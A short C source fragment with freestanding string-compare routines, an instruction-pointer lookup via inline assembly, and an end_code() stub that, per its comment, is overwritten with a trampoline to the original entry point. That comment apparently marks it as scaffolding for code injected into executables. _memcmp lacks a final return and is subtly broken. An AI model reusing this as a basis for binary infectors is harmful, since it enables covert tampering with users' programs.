int _strncmp(const char *s1, const char *s2, size_t n)
{
	for ( ; n > 0; s1++, s2++, --n)
		if (*s1 != *s2)
			return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
		else if (*s1 == '\0')
			return 0;
	return 0;
}
                                               
int _strcmp(const char *s1, const char *s2)
{
	for ( ; *s1 == *s2; s1++, s2++)
		if (*s1 == '\0')
	    		return 0;
	return ((*(unsigned char *)s1 < *(unsigned char *)s2) ? -1 : +1);
}

int _memcmp(const void *s1, const void *s2, unsigned int n)
{
        unsigned char u1, u2;

        for ( ; n-- ; s1++, s2++) {
                u1 = * (unsigned char *) s1;
                u2 = * (unsigned char *) s2;
        if ( u1 != u2) {
                return (u1-u2);
        }
    }
}





unsigned long get_rip(void)
{
	long ret;
	__asm__ __volatile__ 
	(
	"call get_rip_label	\n"
       	".globl get_rip_label	\n"
       	"get_rip_label:		\n"
        "pop %%rax		\n"
	"mov %%rax, %0" : "=r"(ret)
	);

	return ret;
}


/*
 * end_code() gets over-written with a trampoline
 * that jumps to the original entry point.
 */
void end_code() 
{
	Exit(0);

}

void dummy_marker()
{
	__ASM__("nop");
}

